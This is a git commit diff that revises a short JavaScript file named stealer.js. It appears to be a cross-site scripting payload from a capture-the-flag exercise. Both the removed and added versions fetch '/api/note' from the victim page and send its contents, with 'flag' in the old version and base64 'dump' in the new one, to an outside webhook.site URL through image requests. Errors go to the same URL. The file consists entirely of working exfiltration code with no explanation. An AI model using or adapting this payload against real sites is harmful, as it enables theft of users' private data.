42b9934b66aced5dbd253dca08ccf07371afc40f
G-Xhaho <g.xhaho1@gmail.com>
2025-09-13 12:56:59 +0200

    Update stealer.js

--- stealer.js
+++ stealer.js
@@ -1,10 +1,8 @@
-new Image().src = "https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?executed=true";
-
-fetch("/api/note")
-  .then(r => r.json())
-  .then(data => {
-    new Image().src = "https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?flag=" + encodeURIComponent(data.note);
+fetch('/api/note')
+  .then(r => r.text())
+  .then(txt => {
+    new Image().src = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?dump=' + btoa(txt);
   })
-  .catch(err => {
-    new Image().src = "https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?error=" + encodeURIComponent(err.message);
+  .catch(e => {
+    new Image().src = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?fail=' + encodeURIComponent(e.message);
   });
